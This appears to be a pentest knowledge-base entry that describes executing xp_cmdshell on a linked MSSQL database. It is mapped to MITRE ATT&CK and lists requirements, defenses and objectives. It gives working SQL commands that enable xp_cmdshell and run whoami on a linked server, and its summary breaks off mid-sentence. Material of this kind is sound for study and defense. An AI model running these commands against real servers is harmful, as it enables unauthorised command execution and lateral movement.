---
id: 1af50b0f-ef38-4b4a-b0b5-73811e72ee33
name: Execution of xp_cmdshell on Linked Database
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.133184+00:00'
updated_at: '2023-04-10T20:36:44.247931+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[Execute Procedure on Linked Database]]'
- '[[Linked Database]]'
- '[[MSSQL Server]]'
commands:
- '[[Enable advanced options and xp_cmdshell]]'
---

# Execution of xp_cmdshell on Linked Database

## Summary

The Execution of xp_cmdshell on Linked Database technique allows an attacker to execute arbitrary commands on a remote system by enabling xp_cmdshell on a linked database. xp_cmdshell is a system stored procedure that allows the execution of command shell commands on the host operating system. By e

## Description

# Description

The Execution of xp_cmdshell on Linked Database technique allows an attacker to execute arbitrary commands on a remote system by enabling xp_cmdshell on a linked database. xp_cmdshell is a system stored procedure that allows the execution of command shell commands on the host operating system. By enabling xp_cmdshell, an attacker can execute commands on the remote system with the same privileges as the SQL Server service account.

To enable xp_cmdshell, the attacker must have elevated privileges on the linked database. Once enabled, the attacker can execute any command on the remote system, including uploading and downloading files, creating new user accounts, or executing additional malware.

This technique can be used to maintain persistence on a compromised system, exfiltrate data, or move laterally through a network.

## Requirements

1. Elevated privileges on the linked database

## Defense

1. Disable xp_cmdshell on all SQL Server instances and linked databases

1. Restrict privileges on the linked database to limit access to only authorized users

1. Monitor for unusual command shell activity on the host operating system

## Objectives

1. Execute arbitrary commands on a remote system

1. Maintain persistence on a compromised system

1. Exfiltrate data

1. Move laterally through a network

# Instructions

1. To enable xp_cmdshell and execute whoami command, follow these steps:

1. Run the following commands in SQL Server Management Studio:

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

2. Execute the following command to run whoami command:

EXEC xp_cmdshell 'whoami';

**Code**: [[SQL> EXECUTE('EXEC sp_configure ''show advanced op]]

> The above commands are used to enable xp_cmdshell and execute whoami command on a linked database. The first command 'EXEC sp_configure 'show advanced options',1' is used to enable advanced options in SQL Server. The second command 'RECONFIGURE' is used to apply the changes made in the previous command. The third command 'EXEC sp_configure 'xp_cmdshell',1' is used to enable xp_cmdshell. The fourth command 'RECONFIGURE' is used to apply the changes made in the previous command. Finally, the fifth command 'exec xp_cmdshell whoami' is used to execute the whoami command on the linked database.

**Command** ([[Enable advanced options and xp_cmdshell]]):

```bash
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Commands Used

- [[Enable advanced options and xp_cmdshell]]

## Tags

- [[Execute Procedure on Linked Database]]
- [[Linked Database]]
- [[MSSQL Server]]
